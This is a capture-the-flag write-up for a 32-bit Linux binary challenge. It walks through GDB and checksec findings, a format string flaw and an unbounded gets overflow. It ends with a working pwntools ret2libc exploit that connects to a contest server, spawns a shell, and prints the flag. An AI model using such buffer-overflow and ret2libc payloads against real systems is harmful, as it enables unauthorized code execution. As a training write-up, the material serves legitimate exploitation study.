## exploit

In this challenge we have to exploit ELF 32 bit not stripped executable that returns 2 gifts: 
```
Here are some gifts from Santa: 0x8049940 0xf7e48da0
```

With GDB we can notice that the first address refers to a bunch of bytes in `.bss` section:

```
info symbol 0x8049940

section .bss of /home/vagrant/share/xmasCTF/Pinkie/pinkiegift.dms

gdb-peda$ x/40wx 0x8049940
0x8049940 <binsh>:	    0x00000000	0x00000000	0x00000000	0x00000000
0x8049950 <binsh+16>:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049960 <binsh+32>:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049970 <binsh+48>:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049980 <binsh+64>:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049990 <binsh+80>:	0x00000000	0x00000000	0x00000000	0x00000000
0x80499a0 <binsh+96>:	0x00000000	0x00000000	0x00000000	0x00000000
```

Normally the `bss` section is not executable, it could be useful in order to place some shellcode but require a previous call to `mprotect` to execute that, or I could write with `gets` or other libc function some bytes and obtain all strings I need. 

The second gift is a real gift! An address to libc `system` procedure. So now i could try to search in `text` or `data` or `bss` section an `sh` strings and exploit executable without using the first gift. Moreover we can notice from the output of remote program, that ASLR is disabled, `system` is placed at the same address.


Ok now I only have to figure out where vulnerability is, with checksec we can see the following:

```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

We've got no canary, and after executing program with ltrace I can notice that, after printing the gifts, it perform a gets followed by printf and another gets.

The printf output exactly what inserted with the first gets and here we have a format string vulnerability:

```
Here are some gifts from Santa: 0x8049940 0xf7de8850
%x
a7825
```
So we could for istance try to write printf GOT entry in order to call system instead of printf but I considered that: 

* No checks boundary are performed after gets is permormed
* The absence of canary permit to perform ret2libc to system passing `sh` string as argument

The exploit:

```python
#!/usr/bin/env python3
from pwn import *

r=remote('199.247.6.180', 10006)
out=r.recvuntil('\n')
print(out)
addr_system=out.split()[-1]
addr_bin_sh=out.split()[-2]
print(addr_system)
r.send(b"/////////////////////bin/sh"+b"\n")
r.send(p32(int(addr_system,16))*36+p32(0x8048f48)+b"\n")
r.interactive()

r.close()
```
##### flag: X-MAS{F0rm47_57r1ng_15_7h3_b3st_pr353n7_f0r_l1773_buff3r_0v3rfl0w}




